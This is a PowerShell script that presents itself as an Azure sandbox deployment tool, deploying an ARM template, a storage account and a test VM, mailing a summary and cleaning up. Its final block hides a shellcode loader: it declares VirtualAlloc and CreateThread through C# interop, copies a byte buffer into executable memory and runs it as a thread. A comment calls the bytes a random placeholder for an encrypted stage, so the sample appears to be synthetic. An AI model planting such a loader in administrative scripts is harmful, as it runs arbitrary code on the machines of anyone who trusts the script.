<#
.SYNOPSIS
    Deploys a sandbox resource group from an ARM template and validates the result.
.DESCRIPTION
    Runs a template validation first, then creates the resource group, the
    storage account and the test virtual machine before cleaning the sandbox up.
    The cleanup step honours the DryRun switch so the resources can be inspected
    after a failed deployment.
.EXAMPLE
    .\Deploy-PortalTest.ps1 -ResourceGroup rg-portal-test-37
#>

param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$ResourceGroup = 'rg-portal-test-37',

    [ValidateSet('westeurope', "eastus", "northeurope", 'uksouth')]
    [string]$Location = "northeurope",
    [string]$TemplateFile = 'C:\Scripts\templates\portal-test.json',

    [string]$ParameterFile = 'C:\Scripts\templates\portal-test.parameters.json',
    [string]$SubscriptionId = "d4757a58-8796-52f3-7db4-1743cd50e17b",
    [string]$StorageAccount = 'sttest9817',

    [string]$VmName = 'vm-portal-test-37',
    [string]$OutputPath = "C:\Logs\deploy-test-2025-12-02.json",
    [switch]$DryRun
)

$ErrorActionPreference = "Stop"
$hostName = $env:COMPUTERNAME
$InformationPreference = 'SilentlyContinue'
Set-StrictMode -Version 2.0

Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant "contoso.com" -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$validation = Test-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile
if ($validation) {
    $validation | Format-Table -AutoSize
    throw 'Template validation failed.'
}

$deployment = New-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile `
    -Name $DeploymentName `
    -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
$deployment.Outputs | Format-Table -AutoSize

$summary = [pscustomobject]@{
    ResourceGroup     = $ResourceGroup
    Location          = $Location
    DeploymentName    = $DeploymentName
    ProvisioningState = $deployment.ProvisioningState
    StorageAccount    = $StorageAccount
    CompletedAt       = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$summary | ConvertTo-Json -Depth 3 | Set-Content -Path $OutputPath -Encoding UTF8
$style = @'
<style>
body { font-family: Segoe UI; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($summary) | ConvertTo-Html -Title 'Deployment summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.json', '.html') -Encoding UTF8

$MailTo = 'cloudops@contoso.com'
$subject = "Sandbox deployment {0}" -f $deployment.ProvisioningState

Send-MailMessage `
    -To $MailTo `
    -From 'cloudops@contoso.com' `
    -Subject $subject `
    -Body "See the deployment summary attached to the run log." `
    -SmtpServer "smtp.contoso.com" `
    -Port 587 `
    -UseSsl

if (-not $DryRun) {
    Remove-AzResourceGroup -Name $ResourceGroup -Force | Out-Null
    Write-Host ("Removed sandbox resource group {0}" -f $ResourceGroup)
}

Write-Host ("Sandbox deployment finished: {0}" -f $deployment.ProvisioningState) -ForegroundColor Green

$quotas = Get-AzVMUsage -Location $Location -ErrorAction SilentlyContinue |
    Where-Object { $_.CurrentValue -ge ($_.Limit * 0.8) }
$quotas | Select-Object -First 5 Name, CurrentValue, Limit | Format-Table -AutoSize

$pricing = Get-AzConsumptionPriceSheet -ErrorAction SilentlyContinue
Write-Verbose ("Price sheet entries: {0}" -f @($pricing).Count)

$providers = Get-AzResourceProvider -ProviderNamespace Microsoft.Compute -ErrorAction SilentlyContinue
if ($providers) {
    Write-Verbose ("Provider registered: {0}" -f $providers.RegistrationState)
}

$tags = @{
    Environment = 'test'
    Owner       = 'platform-team'
    CostCenter  = 'CC-1042'
}
Write-Verbose ("Tags: {0}" -f ($tags.Keys -join ', '))

$deployLog = Join-Path $env:TEMP ("az-deploy-" + (Get-Date -Format 'yyyyMMdd-HHmmss') + ".log")
Write-Verbose ("Deployment log: {0}" -f $deployLog)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$LogPath = "$env:TEMP\run.log"

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x88, 0x04, 0x24, 0xe8, 0xc4, 0x88, 0x96, 0x97, 0x7c, 0xec, 0x46, 0xf9, 0x95, 0xb9, 0x83, 0xba,
        0x50, 0x37, 0x3f, 0x08, 0xb1, 0x1c, 0x1d, 0x11, 0x6f, 0x20, 0xa8, 0x9d, 0xc9, 0xa2, 0x62, 0x4f,
        0x95, 0x49, 0x5a, 0x06, 0x61, 0x42, 0x76, 0xa7, 0xd0, 0x3b, 0x91, 0xcc, 0x47, 0x02, 0xf5, 0x9d,
        0xed, 0xdb, 0xdb, 0x26, 0xf3, 0xc9, 0xe4, 0x1d, 0xa6, 0x9e, 0xdd, 0xb9, 0xf3, 0x59, 0x17, 0x47,
        0xbd, 0x6c, 0x4f, 0xbd, 0xf8, 0x0a, 0x74, 0xaf, 0x99, 0x4a, 0x5f, 0xb8, 0xe3, 0x84, 0x14, 0x43,
        0xbe, 0xb8, 0xa5, 0x78, 0xed, 0x73, 0x7b, 0x7f, 0x18, 0x99, 0xca, 0xfc, 0x64, 0xcf, 0x43, 0xf3,
        0x1b, 0x0a, 0x26, 0x11, 0xed, 0x05, 0x15, 0xa6, 0xfd, 0xce, 0xb3, 0x9c, 0x01, 0xc1, 0x08, 0x57,
        0x83, 0xe5, 0xde, 0x58, 0xd1, 0x4f, 0xa4, 0xee, 0xac, 0x89, 0xc3, 0xb4, 0x56, 0x6c, 0x59, 0xd3,
        0x01, 0x20, 0x38, 0x59, 0xeb, 0x31, 0xee, 0xfe, 0x51, 0xdc, 0x96, 0x17, 0x40, 0xf0, 0x1e, 0xb9,
        0x49, 0x5a, 0xfe, 0x69, 0x39, 0x53, 0x5c, 0xe1, 0x6a, 0xc9, 0x50, 0xe1, 0xff, 0x31, 0xba, 0x23,
        0x9f, 0x5e, 0x31, 0xa4, 0xb9, 0x4e, 0xd9, 0x87, 0xc0, 0x1a, 0x2c, 0x3e, 0xea, 0x02, 0xde, 0xa9,
        0xa1, 0xbc, 0xb7, 0xe7, 0xe4, 0x78, 0x4c, 0x52, 0x21, 0x35, 0x49, 0xfa, 0x84, 0x04, 0x36, 0x0f,
        0x3c, 0xa1, 0xb4, 0x45, 0x11, 0x4a, 0xb4, 0x1b, 0x6e, 0x45, 0x00, 0x9a, 0x08, 0x60, 0x52, 0xd7,
        0x1b, 0x1e, 0x37, 0xbb, 0x6a, 0x93, 0x52, 0x6e, 0xba, 0x08, 0x6d
    )

    $BufferAddress = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($BufferAddress -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeApi]::WaitForSingleObject($Thread, 2297)
    [void][NativeApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
